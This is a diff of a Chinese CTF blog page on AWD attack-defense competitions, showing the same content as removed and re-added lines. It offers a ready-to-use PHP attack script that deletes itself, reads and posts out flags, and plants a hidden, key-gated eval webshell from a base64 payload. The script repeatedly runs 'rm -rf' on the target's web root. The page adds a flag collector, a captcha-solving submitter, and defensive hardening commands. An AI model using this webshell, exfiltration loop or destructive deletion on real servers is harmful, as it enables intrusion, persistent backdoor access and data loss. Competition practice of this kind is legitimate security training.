+ListDir(web_dir)
+GetHash()
+while True:
+print(time.ctime() &#39; 安全&#39;)
+FileMonitor()
+time.sleep(1) # 监控间隔，按需修改
+</code></pre>
+<h1 id="AWD线下赛攻击脚本："><a href="#AWD线下赛攻击脚本：" class="headerlink" title="AWD线下赛攻击脚本："></a>AWD线下赛攻击脚本：</h1><p>（1）内存马&amp;自动获取刷新的flag</p>
 <p>该脚本功能：</p>
-<p>1. 该脚本为内存脚本，访问一下就自删除，不留痕迹。</p>
-<p>2. 自动读取 flag，并将 flag 提交到指定地址，会自动检测是否更新 flag，只有更新了 flag 才会提交，需要在脚本中修改 flag 物理路径。</p>
-<p>3. 会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问 http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为 a。</p>
-<p>木马原始代码如下（只要别人不知道 key，就没办法黑吃黑）：</p>
-<p><code>&lt;?php $key=$_GET['key'];$keyhash=md5($key);if($keyhash==='c403d59fea33113df44d465aeec336ab') &#123;    eval($_POST['a']);&#125;echo'file not find.';?&gt;</code></p>
-<p>这个只作为备用连接，flag 正常自己提交过来的话就不用管。</p>
-<p>4. 该脚本会不断删除目标的网站源码，别人扣分等于我们加分。</p>
-<p>5. 脚本命名必须为 awd2021.php，若要修改的话需要同步修改下面代码中的文件名。</p>
-<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span>?php</pre></td></tr><tr><td data-num="2"></td><td><pre>function send_post<span class="token punctuation">(</span>$url<span class="token punctuation">,</span> $post_data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>$postdata <span class="token operator">=</span> http_build_query<span class="token punctuation">(</span>$post_data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>$options <span class="token operator">=</span> array<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token string">'http'</span> <span class="token operator">=</span><span class="token operator">></span> array<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token string">'method'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'POST'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token string">'header'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'Content-type:application/x-www-form-urlencoded'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> $postdata<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token string">'timeout'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">15</span> <span class="token operator">*</span> <span class="token number">60</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>$context <span class="token operator">=</span> stream_context_create<span class="token punctuation">(</span>$options<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>$result <span class="token operator">=</span> file_get_contents<span class="token punctuation">(</span>$url<span class="token punctuation">,</span> false<span class="token punctuation">,</span> $context<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">return</span> $result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>$flag_tmp<span class="token operator">=</span><span class="token string">'flag&#123;xxx&#125;'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token decorator annotation punctuation">@unlink</span> <span class="token punctuation">(</span><span class="token string">'awd2021.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>$flag<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'cat flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>$data<span class="token operator">=</span>array<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token string">'flag'</span> <span class="token operator">=</span><span class="token operator">></span> $flag</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>$flag<span class="token operator">!=</span>$flag_tmp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>send_post<span class="token punctuation">(</span><span class="token string">'http://127.0.0.1/getflag.php'</span><span class="token punctuation">,</span> $data<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>$flag_tmp<span class="token operator">=</span>$flag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>$shell<span class="token operator">=</span>base64_decode<span class="token punctuation">(</span><span class="token string">'PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4='</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span>file_exists<span class="token punctuation">(</span><span class="token string">'.c403d59fea33113df44d465aeec336ab.php'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>file_put_contents<span class="token punctuation">(</span><span class="token string">'.c403d59fea33113df44d465aeec336ab.php'</span><span class="token punctuation">,</span> $shell<span class="token punctuation">,</span> FILE_APPEND<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>system<span class="token punctuation">(</span><span class="token string">'rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>?<span class="token operator">></span></pre></td></tr></table></figure><p>（2）服务端接收 flag</p>
-<p>1. 按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个 phpstudy 跑起来，若不通的话直接放自己的靶机服务器上。</p>
-<p>2. 这个脚本默认名字为 getflag.php，如果修改的话需要修改内存脚本中对应的文件名。</p>
-<p>3. 新的 flag 会源源不断提交过来，在当前目录的 shuoshuren_flag.txt 里面。</p>
-<p><code>&lt;?php$flag=$_POST['flag'];file_put_contents('shuoshuren_flag.txt', $flag.'\n', FILE_APPEND);?&gt;</code></p>
-<p>（3）自动提交 flag 脚本</p>
-<p>根据往年经验，flag 提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交 flag 的目的，平台没有验证码的话就不用识别。</p>
-<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># base python3</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> json</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">GetPic</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）</span></pre></td></tr><tr><td data-num="9"></td><td><pre>pic_content<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content</pre></td></tr><tr><td data-num="10"></td><td><pre>pic_base64<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pic_content<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>data<span class="token operator">=</span><span class="token string">'base64='</span> pic_base64</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>yzm<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.3.103:8899/base64'</span><span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">return</span> yzm</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">return</span> <span class="token string">'yzm'</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">def</span> <span class="token function">PostFlag</span><span class="token punctuation">(</span>PostUrl<span class="token punctuation">,</span>PicUrl<span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 提交 flag</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>flag_list<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>headers<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">#请求头需要现场抓包</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">for</span> flag <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">if</span> flag <span class="token keyword">in</span> flag_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; 重复'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>GetYzm<span class="token operator">=</span>GetPic<span class="token punctuation">(</span>PicUrl<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'请求体需要现场抓包，字典格式'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">try</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>PostUrl<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">if</span> <span class="token string">'成功的标识符'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; 提交成功'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>flag_list_ok<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; 提交失败'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">except</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'其他错误'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>flag_list_ok<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#</span></pre></td></tr><tr><td data-num="42"></td><td><pre>PostFlag<span class="token punctuation">(</span><span class="token string">'提交flag的请求地址'</span><span class="token punctuation">,</span><span class="token string">'flag平台验证码的地址'</span><span class="token punctuation">,</span><span class="token string">'shuoshuren_flag.txt'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token comment">#休息 5 分钟，可以按需修改</span></pre></td></tr></table></figure><h1 id="备份网站"><a class="anchor" href="#备份网站">#</a> 备份网站</h1>
-<p>scp -r <span class="exturl" data-url="bWFpbHRvOnJvb3RAMTI3LjAuMC4x">root@127.0.0.1</span>:/www/html ./   下载远程的 /www/html 到当前的目录</p>
-<p>scp -r testfile <span class="exturl" data-url="bWFpbHRvOnJvb3RAMTI3LjAuMC4x">root@127.0.0.1</span>:/www/html    把当前目录的 testfile 上传到远程的 /www/html</p>
-<h1 id="查看已建立的网络连接以及对应进程"><a class="anchor" href="#查看已建立的网络连接以及对应进程">#</a> 查看已建立的网络连接以及对应进程</h1>
-<p>​	netstat -antulp | grep EST</p>
-<h1 id="用户管理"><a class="anchor" href="#用户管理">#</a> 用户管理</h1>
-<p>​	whoami　　// 查看当前用户<br />
-​	pkill -kill -t &lt;用户 tty&gt;　　 // 踢掉当前登录用户</p>
-<h1 id="进程管理"><a class="anchor" href="#进程管理">#</a> 进程管理</h1>
-<p>​	查看进程信息<br />
-​	ps aux | grep pid 或者进程名　　<br />
-​</p>
+<p>1.该脚本为内存脚本，访问一下就自删除，不留痕迹。</p>
+<p>2.自动读取flag，并将flag提交到指定地址，会自动检测是否更新flag，只有更新了flag才会提交，需要在脚本中修改flag物理路径。</p>
+<p>3.会生成不死马，不死马具有隐藏和欺骗功能。用蚁剑访问<span class="exturl" data-url="aHR0cDovL3h4eC8uYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIucGhwP2tleT1zc3IyMDIxc2h1b3NodXJlbm1kNSVFRiVCQyU4QyVFNSVBRiU4NiVFNyVBMCU4MSVFNCVCOCVCQWElRTMlODAlODI=">http://xxx/.c403d59fea33113df44d465aeec336ab.php?key=ssr2021shuoshurenmd5，密码为a。</span></p>
+<p>木马原始代码如下（只要别人不知道key，就没办法黑吃黑）：</p>
+<p><code>&lt;?php $key=$_GET[&#39;key&#39;];$keyhash=md5($key);if($keyhash===&#39;c403d59fea33113df44d465aeec336ab&#39;) &#123;    eval($_POST[&#39;a&#39;]);&#125;echo&#39;file not find.&#39;;?&gt;</code></p>
+<p>这个只作为备用连接，flag正常自己提交过来的话就不用管。</p>
+<p>4.该脚本会不断删除目标的网站源码，别人扣分等于我们加分。</p>
+<p>5.脚本命名必须为awd2021.php，若要修改的话需要同步修改下面代码中的文件名。</p>
+<pre><code class="python">&lt;?php
+function send_post($url, $post_data) &#123;
+$postdata = http_build_query($post_data);
+$options = array(
+&#39;http&#39; =&gt; array(
+&#39;method&#39; =&gt; &#39;POST&#39;,
+&#39;header&#39; =&gt; &#39;Content-type:application/x-www-form-urlencoded&#39;,
+&#39;content&#39; =&gt; $postdata,
+&#39;timeout&#39; =&gt; 15 * 60
+)
+);
+$context = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+&#125;
+$flag_tmp=&#39;flag&#123;xxx&#125;&#39;;
+@unlink (&#39;awd2021.php&#39;);
+while (True) &#123;
+$flag=system(&#39;cat flag.txt&#39;);
+$data=array(
+&#39;flag&#39; =&gt; $flag
+);
+if ($flag!=$flag_tmp) &#123;
+send_post(&#39;http://127.0.0.1/getflag.php&#39;, $data);
+&#125;
+$flag_tmp=$flag;
+$shell=base64_decode(&#39;PD9waHAgJGtleT0kX0dFVFsia2V5Il07CiRrZXloYXNoPW1kNSgka2V5KTsKaWYoJGtleWhhc2g9PT0iYzQwM2Q1OWZlYTMzMTEzZGY0NGQ0NjVhZWVjMzM2YWIiKSB7CglldmFsKCRfUE9TVFsiYSJdKTsKfQplY2hvImZpbGUgbm90IGZpbmQuIjsKPz4=&#39;);
+if (file_exists(&#39;.c403d59fea33113df44d465aeec336ab.php&#39;)==0) &#123;
+file_put_contents(&#39;.c403d59fea33113df44d465aeec336ab.php&#39;, $shell, FILE_APPEND);
+&#125;
+system(&#39;rm -rf /var/www/html/* !(.c403d59fea33113df44d465aeec336ab.php)&#39;);
+&#125;
+?&gt;
+</code></pre>
+<p>（2）服务端接收flag</p>
+<p>1.按照往年比赛经验，靶机和我们的电脑是互通的，这个脚本可以本机开一个phpstudy跑起来，若不通的话直接放自己的靶机服务器上。</p>
+<p>2.这个脚本默认名字为getflag.php，如果修改的话需要修改内存脚本中对应的文件名。</p>
+<p>3.新的flag会源源不断提交过来，在当前目录的shuoshuren_flag.txt里面。</p>
+<p><code>&lt;?php$flag=$_POST[&#39;flag&#39;];file_put_contents(&#39;shuoshuren_flag.txt&#39;, $flag.&#39;\n&#39;, FILE_APPEND);?&gt;</code></p>
+<p>（3）自动提交flag脚本</p>
+<p>根据往年经验，flag提交平台是有验证码的，所以这个脚本调用了验证码训练识别模型，达到自动化提交flag的目的，平台没有验证码的话就不用识别。</p>
+<pre><code class="python"># base python3
+import requests
+import base64
+import json
+import time
+
+
+def GetPic(url): # 获取验证码并识别，这里会调用我本机的验证码训练识别模型（refer：算命瞎子）
+pic_content=requests.get(url).content
+pic_base64=base64.b64encode(pic_content).decode()
+data=&#39;base64=&#39; pic_base64
+try:
+yzm=requests.post(&#39;http://192.168.3.103:8899/base64&#39;,data=data).text
+return yzm
+except:
+return &#39;yzm&#39;
+
+def PostFlag(PostUrl,PicUrl,flag): # 提交flag
+with open(flag,&#39;r&#39;) as f:
+flag_list=f.read().split(&#39;\n&#39;)
+headers=&#123;
+#请求头需要现场抓包
+&#125;
+for flag in flag_list:
+if flag in flag_list:
+print(&#39;&#123;&#125; 重复&#39;.format(flag))
+else:
+GetYzm=GetPic(PicUrl)
+data = json.dumps(&#123;&#39;请求体需要现场抓包，字典格式&#39;&#125;)
+try:
+res=requests.post(url=PostUrl,headers=headers,data=data)
+if &#39;成功的标识符&#39; in res.text:
+print(&#39;&#123;&#125; 提交成功&#39;.format(flag))
+flag_list_ok.append(flag)
+else:
+print(&#39;&#123;&#125; 提交失败&#39;.format(flag))
+except:
+print(&#39;其他错误&#39;)
+
+flag_list_ok=[]
+while True:#
+PostFlag(&#39;提交flag的请求地址&#39;,&#39;flag平台验证码的地址&#39;,&#39;shuoshuren_flag.txt&#39;)
+time.sleep(300)#休息5分钟，可以按需修改
+
+</code></pre>
+<h1 id="备份网站"><a href="#备份网站" class="headerlink" title="备份网站"></a>备份网站</h1><p>scp -r <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjMTE2OyYjeDQwOyYjNDk7JiN4MzI7JiM1NTsmI3gyZTsmI3gzMDsmI3gyZTsmI3gzMDsmI3gyZTsmIzQ5Ow==">&#114;&#x6f;&#111;&#116;&#x40;&#49;&#x32;&#55;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#49;</span>:/www/html ./   下载远程的/www/html到当前的目录</p>
+<p>scp -r testfile <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjeDZmOyYjMTExOyYjMTE2OyYjNjQ7JiM0OTsmI3gzMjsmI3gzNzsmI3gyZTsmI3gzMDsmIzQ2OyYjeDMwOyYjeDJlOyYjNDk7">&#114;&#x6f;&#111;&#116;&#64;&#49;&#x32;&#x37;&#x2e;&#x30;&#46;&#x30;&#x2e;&#49;</span>:/www/html    把当前目录的testfile上传到远程的/www/html</p>
+<h1 id="查看已建立的网络连接以及对应进程"><a href="#查看已建立的网络连接以及对应进程" class="headerlink" title="查看已建立的网络连接以及对应进程"></a>查看已建立的网络连接以及对应进程</h1><p>​    netstat -antulp | grep EST</p>
+<h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><p>​    whoami　　//查看当前用户<br>​    pkill -kill -t &lt;用户tty&gt;　　 //踢掉当前登录用户</p>
+<h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><p>​    查看进程信息<br>​    ps aux | grep pid或者进程名　　<br>​    </p>
 <pre><code>查看指定端口被哪个进程占用
 lsof -i:端口号 
 或者 netstat -tunlp|grep 端口号
@@ -219,29 +402,23 @@ kill PID
 killall &lt;进程名&gt;
 kill -9 &lt;PID&gt;
 </code></pre>
-<h1 id="iptables命令"><a class="anchor" href="#iptables命令">#</a> iptables 命令</h1>
-<p>​	封杀某个 IP 或者 ip 段，如：123.4.5.6<br />
-​	iptables -I INPUT -s 123.4.5.6 -j DROP<br />
-​	iptables -I INPUT -s 123.4.5.1/24 -j DROP<br />
-​</p>
+<h1 id="iptables命令"><a href="#iptables命令" class="headerlink" title="iptables命令"></a>iptables命令</h1><p>​    封杀某个IP或者ip段，如：123.4.5.6<br>​    iptables -I INPUT -s 123.4.5.6 -j DROP<br>​    iptables -I INPUT -s 123.4.5.1/24 -j DROP<br>​    </p>
 <pre><code>禁止从某个主机ssh远程访问登陆到本机，如123.4.5.6
 iptable -t filter -A INPUT -s 123.4.5.6 -p tcp --dport 22 -j DROP
 </code></pre>
-<h1 id="mysql数据库操作"><a class="anchor" href="#mysql数据库操作">#</a> Mysql 数据库操作</h1>
-<pre><code>备份mysql数据库
+<h1 id="Mysql数据库操作"><a href="#Mysql数据库操作" class="headerlink" title="Mysql数据库操作"></a>Mysql数据库操作</h1><pre><code>备份mysql数据库
 mysqldump -u 用户名 -p 密码 数据库名 &gt; back.sql　　//备份指定数据库
 mysqldump --all-databases &gt; bak.sql　　　　//备份所有数据库
 
 还原mysql数据库
 mysql -u 用户名 -p 密码 数据库名 &lt; bak.sql
 </code></pre>
-<h1 id="安全检查"><a class="anchor" href="#安全检查">#</a> 安全检查</h1>
-<pre><code>find / *.php -perm 4777 　　 //查找777的权限的php文件 
-awk -F: '&#123;if($3==0)print $1&#125;' /etc/passwd　　//查看root权限的账号
+<h1 id="安全检查"><a href="#安全检查" class="headerlink" title="安全检查"></a>安全检查</h1><pre><code>find / *.php -perm 4777 　　 //查找777的权限的php文件 
+awk -F: &#39;&#123;if($3==0)print $1&#125;&#39; /etc/passwd　　//查看root权限的账号
 crontab -l　　//查看计划任务
 
 检测所有的tcp连接数量及状态
-netstat -ant|awk '&#123;print $5 &quot;\t&quot; $6&#125;' |grep &quot;[1-9][0-9]*\.&quot;|sed -e 's/::ffff://' -e 's/:[0-9]*//'|sort|uniq -c|sort -rn
+netstat -ant|awk &#39;&#123;print $5 &quot;\t&quot; $6&#125;&#39; |grep &quot;[1-9][0-9]*\.&quot;|sed -e &#39;s/::ffff://&#39; -e &#39;s/:[0-9]*//&#39;|sort|uniq -c|sort -rn
 　　
 查看页面访问排名前十的IP
 cat /var/log/apache2/access.log  | cut -f1 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10
@@ -249,9 +426,20 @@ cat /var/log/apache2/access.log  | cut -f1 -d &quot; &quot; | sort | uniq -c | s
 查看页面访问排名前十的URL
 cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | sort -k 1 -r | head -10　　
 </code></pre>
-<p></p>
-<p>再推荐一篇安全应急排查手册：<span class="exturl" data-url="aHR0cHM6Ly95cS5hbGl5dW4uY29tL2FydGljbGVzLzE3NzMzNw==">https://yq.aliyun.com/articles/177337</span></p>
-<p>来自 http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml</p>
+<p>　</p>
+<h1 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h1><p>passwd</p>
+<h1 id="后门用户"><a href="#后门用户" class="headerlink" title="后门用户"></a>后门用户</h1><p>cat /etc/passwd | grep bash<br>userdel hack<br>userdel backdoor</p>
+<h1 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h1><p>scp -r <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjMTExOyYjMTExOyYjMTE2OyYjeDQwOyYjNDk7JiM1MDsmI3gzNzsmIzQ2OyYjNDg7JiN4MmU7JiN4MzA7JiM0OTs=">&#x72;&#111;&#111;&#116;&#x40;&#49;&#50;&#x37;&#46;&#48;&#x2e;&#x30;&#49;</span>:/var/www/html ./<br>scp testfile <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjeDZmOyYjMTE2OyYjeDQwOyYjeDMxOyYjeDMyOyYjNTU7JiN4MmU7JiM0ODsmI3gyZTsmIzQ4OyYjNDY7JiN4MzE7">&#x72;&#x6f;&#x6f;&#116;&#x40;&#x31;&#x32;&#55;&#x2e;&#48;&#x2e;&#48;&#46;&#x31;</span>:/var/www/html</p>
+<p>mysql -u root -h localhost -p<br>mysqldump TBNAME &gt; ~/tbname.sql</p>
+<h1 id="改php数据库密码"><a href="#改php数据库密码" class="headerlink" title="改php数据库密码"></a>改php数据库密码</h1><p>方法一：update mysql.users set password=password(“123..com “) where user = ‘check’;<br>              flush privileges;</p>
+<p>方法二：set password for root@localhost = password(‘123..com’);</p>
+<p>SELECT user,host FROM mysql.user;<br>use mysql;<br>update user set host=’localhost’ where user=’root’;<br>flush privileges; </p>
+<h1 id="通防"><a href="#通防" class="headerlink" title="通防"></a>通防</h1><p>//通过winscp，等方式，将cwphp.php通防脚本放到/var/www/html<br>cd /var/www/html<br>find -name ‘*.php’ -exec sed -i “1i <?php @include_once('/var/www/html/cwphp.php');?>“ {} ;</p>
+<h1 id="查端口-禁用"><a href="#查端口-禁用" class="headerlink" title="查端口,禁用"></a>查端口,禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p>
+<h1 id="找简单漏洞"><a href="#找简单漏洞" class="headerlink" title="找简单漏洞"></a>找简单漏洞</h1><p>grep -rl eval /var/www/html<br>eval base64 system file_get_contents readfile fopen<br>find . -name ‘<em>.php’ | xargs grep -n ‘eval(‘<br>find . -name ‘</em>.php’ | xargs grep -n ‘assert(‘<br>find . -name ‘*.php’ | xargs grep -n ‘system(‘</p>
+<h1 id="查端口禁用"><a href="#查端口禁用" class="headerlink" title="查端口禁用"></a>查端口禁用</h1><p>netstat -antulp<br>iptables -I INPUT -p tcp –dprot 22 -j DROP    </p>
+<p>再推荐一篇安全应急排查手册：<span class="exturl" data-url="aHR0cHM6Ly95cS5hbGl5dW4uY29tL2FydGljbGVzLzE3NzMzNw==">https://yq.aliyun.com/articles/177337</span> </p>
+<p>部分来自<span class="exturl" data-url="aHR0cDovL3d3dy4zNjBkb2MuY29tL2NvbnRlbnQvMjEvMDYyMS8xNC83MTkzOTY2Ml85ODMwMjM2Mjguc2h0bWw=">http://www.360doc.com/content/21/0621/14/71939662_983023628.shtml</span></p>
 
       <div class="tags">
           <a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a>
@@ -266,7 +454,7 @@ cat /var/log/apache2/access.log  | cut -f4 -d &quot; &quot; | sort | uniq -c | s
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2021-12-20 10:56:14" itemprop="dateModified" datetime="2021-12-20T10:56:14+08:00">2021-12-20</time>
+    <time title="Modified: 2021-12-22 21:01:00" itemprop="dateModified" datetime="2021-12-22T21:01:00+08:00">2021-12-22</time>
   </span>
   <span id="AWD/" class="item leancloud_visitors" data-flag-title="AWD 脚本和加固命令" title="Views">
       <span class="icon">
